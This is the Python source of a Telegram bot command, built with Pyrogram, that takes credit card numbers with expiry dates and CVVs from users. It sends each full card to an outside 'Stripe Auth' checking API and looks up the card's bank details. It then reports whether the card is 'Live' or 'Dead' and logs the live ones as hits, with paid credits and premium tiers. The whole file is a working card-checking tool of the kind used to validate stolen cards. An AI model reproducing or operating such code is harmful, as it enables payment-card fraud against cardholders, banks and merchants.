from pyrogram import Client,filters
import requests
import json
import re
import time
from plugins.func.users_sql import *
from datetime import date
import requests
import json
session = requests.session()
@Client.on_message(filters.command ('au'))
async def cmd_au(Client,message):
  try:
    #NES TOOLS
    user_id = str(message.from_user.id)
    chat_type = str(message.chat.type)
    chat_id = str(message.chat.id)
    #PLAN CHECK 
    
    regdata = fetchinfo(user_id)
    results = str(regdata)
    if results=='None':
      resp = "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗 𝗬𝗘𝗧 ⚠️. 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥 𝗙𝗜𝗥𝗦𝗧 𝗕𝗬 𝗨𝗦𝗜𝗡𝗚 /register 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘."
      await message.reply_text(resp,message.id)
    else:
      #HERE
      #PM AND AUTH CHECK
      pm = fetchinfo(user_id)
      status = pm[2]
      role = status
      GROUP = open("plugins/group.txt").read().splitlines()
      if chat_type=="ChatType.PRIVATE" and status=="FREE" :
        resp = "𝗢𝗡𝗟𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 𝗔𝗥𝗘 𝗔𝗟𝗟𝗢𝗪𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗕𝗢𝗧 𝗜𝗡 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 ⚠️.𝗬𝗢𝗨 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗙𝗥𝗘𝗘𝗟𝗬 𝗕𝗢𝗧 𝗛𝗘𝗥𝗘 @cyberpirateschats"
        await message.reply_text(resp,message.id)
      
      elif chat_type=="ChatType.GROUP" or   chat_type=="ChatType.SUPERGROUP" and chat_id not in GROUP:
        resp = "𝗨𝗡𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗖𝗛𝗔𝗧 ❌. 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 @mtctechx 𝗧𝗢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘."
        await message.reply_text(resp,message.id)
      else:
        #CREDIT CHECK
        chk_credit = fetchinfo(user_id)
        credit = int(chk_credit[5])
        if credit < 3:
          resp = "𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗖𝗥𝗘𝗗𝗜𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘 ⚠️ . 𝗥𝗘𝗖𝗛𝗔𝗥𝗚𝗘 𝗖𝗥𝗘𝗗𝗜𝗧 𝗨𝗦𝗜𝗡𝗚 /buy 𝗢𝗥 𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗙𝗥𝗘𝗘 𝗖𝗥𝗘𝗗𝗜𝗧 𝗨𝗦𝗜𝗡𝗚 𝗚𝗜𝗙𝗧𝗖𝗢𝗗𝗘 ."
          await message.reply_text(resp,message.id)
        else:
          #ANTISPAM MODULE
          user_id = str(message.from_user.id)
          results = fetchinfo(user_id)
          status = results[2]
          antispam_time = int(results[7])
          now = int(time.time())
          count_antispam = now - antispam_time
          if status=='FREE' and count_antispam < 30:
            after = 30 - count_antispam
            resp = f"""
𝗔𝗡𝗧𝗜𝗦𝗣𝗔𝗠 ⚠️
𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
            """
            await message.reply_text(resp,message.id)
          elif status=='PREMIUM' and count_antispam < 5:
            after = 5 - count_antispam
            resp = f"""
𝗔𝗡𝗧𝗜𝗦𝗣𝗔𝗠 ⚠️
𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
            """
            await message.reply_text(resp,message.id)
          
          else:
            if message.reply_to_message:
              cc = message.reply_to_message.text
          
            else:
              cc = message.text[len('/au '):]
            if len(cc) == 0:
                nocc = """
𝗚𝗜𝗩𝗘 𝗠𝗘 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗖𝗖 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
              """
                return await message.reply_text(nocc,message.id) 
              
              
            cards = []
            x = cc
            input = re.findall(r"[0-9]+", x)
            if not input or len(input) < 3:
                nocc = """
𝗚𝗜𝗩𝗘 𝗠𝗘 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗖𝗖 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️
              """
                return await message.reply_text(nocc,message.id) 
              
            if len(input) == 3:
              cc = input[0]
              if len(input[1]) == 3:
                  mes = input[2][:2]
                  ano = input[2][2:]
                  cvv = input[1]
              else:
                  mes = input[1][:2]
                  ano = input[1][2:]
                  cvv = input[2]
            else:
              cc = input[0]
              if len(input[1]) == 3:
                mes = input[2]
                ano = input[3]
                cvv = input[1]
              else:
                mes = input[1]
                ano = input[2]
                cvv = input[3]
              if len(mes) == 2 and (mes > '12' or mes < '01'):
                ano1 = mes
                mes = ano
                ano = ano1
              
          
              if (cc, mes, ano, cvv):
                cards.append([cc, mes, ano, cvv])
              fullcc = f"{cc}|{mes}|{ano}|{cvv}"
              firstresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - □□□□□
⊗ GATEWAY- Stripe Auth
</b>
              """
              
              firstchk = await message.reply_text(firstresp,message.id)
              secondresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■□□□□
⊗ GATEWAY- Stripe Auth
</b>
              """
              time.sleep(1)
              secondchk = await Client.edit_message_text(message.chat.id,firstchk.id,secondresp)
              thirdresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■□□□
⊗ GATEWAY- Stripe Auth
</b>
              """
              thirdchk = await Client.edit_message_text(message.chat.id,secondchk.id,thirdresp)
            #STARTED CHECKING CC#  
              tic = time.perf_counter()
              authurl = f"https://www.mainulhasanbd.tk/prvClientauth/api.php?lista={fullcc}"
              reqone = session.get(authurl)
              result = reqone.text
              fourthresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■□□
⊗ GATEWAY- Stripe Auth
</b>
              """
              fourthchk = await Client.edit_message_text(message.chat.id,thirdchk.id,fourthresp)
            #BIN RESPINSE
              fbin = cc[:6]
              
              bin = session.get(f"https://lookup.binlist.net/{fbin}").json()
              try:
                brand = bin["scheme"].upper()
              except:
                brand = "N/A"
              try:
                type = bin["type"].upper()
              except:
                type = "N/A"
              try:
                level = bin["brand"].upper()
              except:
                level = "N/A"
              try:
                bank_data= bin["bank"]
              except:
                bank_data = "N/A"
              try:
                bank = bank_data["name"].upper()
              except:
                bank = "N/A"
              try:
                country_data = bin["country"]
              except:
                country_data = "N/A"
              try:
                country = country_data["name"].upper()
              except:
                country = "N/A"
              try:
                flag = country_data["emoji"]
              except:
                flag = "N/A"
              try:
                currency = country_data["currency"].upper()
              except:
                currency = "N/A"
              toc = time.perf_counter()
            #RESPONSE SECTION 
              fifthresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■■□
⊗ GATEWAY- Stripe Auth
</b>
              """
              fifthchk = await Client.edit_message_text(message.chat.id,fourthchk.id,fifthresp)
              sixresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■■■
⊗ GATEWAY- Stripe Auth
</b>
              """
              sixchk = await Client.edit_message_text(message.chat.id,fifthchk.id,sixresp)
              if "succeeded" in result:
                status = "Live 🟢"
                response = "CVV Matched ✅"
                await hits_au(fullcc,response)
              elif "insufficient_funds" in result:
                status = "Live 🟢"
                response = "Insufficient Funds ❎"
                await hits_au(fullcc,response)
              elif "incorrect_cvc" in result:
                status = "Live 🟡"
                response = "CCN Live ❎"
                await hits_au(fullcc,response)
              elif "transaction_not_allowed" in result:
                status = "Live 🟡"
                response = "Card Doesn't Support Purchase ❎"
              elif "do_not_honor" in result:
                status = "Dead 🔴"
                response = "Do Not Honor 🚫"
              elif "stolen_card" in result:
                status = "Dead 🔴"
                response = "Stolen Card 🚫"
              elif "lost_card" in result:
                status = "Dead 🔴"
                response = "Lost Card 🚫"
              elif "pickup_card" in result:
                status = "Dead 🔴"
                response = "Pickup Card 🚫"
              elif "incorrect_number" in result:
                status = "Dead 🔴"
                response = "Incorrect Card Number 🚫"
              elif "expired_card" in result:
                status = "Dead 🔴"
                response = "Expired Card 🚫"
              elif "generic_decline" in result:
                status = "Dead 🔴"
                response = "Generic Decline 🚫"
              elif "fraudulent" in result:
                status = "Dead 🔴"
                response = "Fraudulent 🚫"
              elif "lock_timeout" in result:
                status = "Dead 🔴"
                response = "Api Error 🚫"
              elif "Your card was declined." in result:
                status = "Dead 🔴"
                response = "Generic Decline 🚫"
              elif "intent_confirmation_challenge" in result:
                status = "Dead 🔴"
                response = "Captcha 😥"
              elif "stripe_3ds2_fingerprint" in result:
                status = "Live 🟡"
                response = "3D Secured ❎"
              elif "Your card does not support this type of purchase." in result:
                status = "Live 🟡"
                response = "Locked Card 🚫"
              elif "parameter_invalid_empty" in result:
                status = "Dead 🔴"
                response = "404 error 🚫"
              elif "invalid_request_error" in result:
                status = "Dead 🔴"
                response = "404 error 🚫"
            
              else:
                status = "Dead 🔴"
                response = "Generic Decline 🚫"
              
          #--------------FINAL RESPONSE ------------#
              
              finalresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - {status}
⊗ Response - {response}
⊗ GATEWAY- Stripe Auth 
－－－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {fbin} - {brand} - {type} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {flag} - {currency}
－－－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! 🌐 
⌧ Time in Progress - {toc - tic:0.4f}sec
⌧ Credit Deducted - 1
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️ [ {role} ]
⌧ Client by - <a href="tg://user?id=1386134927">[ 🇧🇩 ] ＭＴＣＴＥＣＨＸ 👑</a>
－－－－－－－－－－－－－－－－</b>
            """
            
              finalchk = await Client.edit_message_text(message.chat.id,sixchk.id,finalresp)
              #ANTISPAM TIME SET
              module_name = "antispam_time"
              value = int(time.time())
              updatedata(user_id,module_name,value)
              
              fetch= fetchinfo(user_id)
              credit = int(fetch[5])
              module_name = "credit"
              deduct = credit - 1
              value = deduct
              updatedata(user_id,module_name,value)
              await plan_expirychk(user_id)
  except Exception as e:
      print(e)